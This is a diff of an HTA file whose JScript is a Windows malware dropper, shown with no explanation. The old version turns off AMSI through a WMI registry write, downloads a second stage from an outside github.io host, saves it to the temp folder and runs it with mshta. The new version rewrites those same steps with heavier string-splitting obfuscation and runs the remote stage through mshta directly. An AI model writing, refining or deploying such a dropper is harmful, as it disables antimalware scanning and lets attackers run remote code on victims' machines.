@@ -1,32 +1,11 @@
-<html>
-<head><title>.</title>
+<html><head><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no"
   showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
 <script language="JScript">
-window.resizeTo(0,0);
-window.moveTo(-2000,-2000);
 try{
-  // Kill AMSI before anything else
-  var wmi=GetObject('win'+'mgmts:\\\\.\\ro'+'ot\\ci'+'mv2');
-  wmi.Get('StdRegProv').SetDWORDValue(2147483649,'SOFTWARE\\Mi'+'crosoft\\Win'+'dows Scr'+'ipt\\Set'+'tings','Am'+'siEn'+'able',0);
-
-  // Download stage2
-  var x=new ActiveXObject('MSX'+'ML2.Ser'+'verX'+'MLHT'+'TP.6.0');
-  x.SetOption(2,13056);
-  x.open('G'+'ET','htt'+'ps://ka'+'lk17jjr-b'+'ot.gith'+'ub.io/di'+'cerigge'+'r/stage'+'2.ht'+'ml',false);
-  x.send();
-  if(x.status!=200)throw 1;
-
-  // Write to temp
-  var fso=new ActiveXObject('Scri'+'pting.Fi'+'leSyste'+'mObjec'+'t');
-  var tp=fso.GetSpecialFolder(2)+'\\s'+'2.'+'ht'+'a';
-  var tf=fso.CreateTextFile(tp,true);
-  tf.Write(x.responseText);
-  tf.Close();
-
-  // Run with mshta via ShellExecute
-  new ActiveXObject('Shel'+'l.Appl'+'icati'+'on').ShellExecute('m'+'sh'+'ta',tp,'','o'+'pen',0);
+var z=this,a='Act'+'iveXOb'+'ject',b='Ge'+'tOb'+'ject',c='Se'+'tDW'+'ORDV'+'alue',d='Sh'+'ellEx'+'ecute';
+z[b]('win'+'mgmts:\\\\.\\ro'+'ot\\ci'+'mv2:StdRe'+'gProv')[c](2147483649,'SOFTW'+'ARE\\Mi'+'croso'+'ft\\Wind'+'ows Scr'+'ipt\\Sett'+'ings','Ams'+'iEnab'+'le',0);
+z[a]('She'+'ll.Appl'+'icati'+'on')[d]('ms'+'ht'+'a','htt'+'ps://ka'+'lk17jjr'+'-bot.gi'+'thub.i'+'o/dice'+'rigger'+'/stage'+'2.ht'+'ml','','op'+'en',0);
 }catch(e){}
 window.close();
-</script>
-</head><body></body></html>
+</script></head><body></body></html>
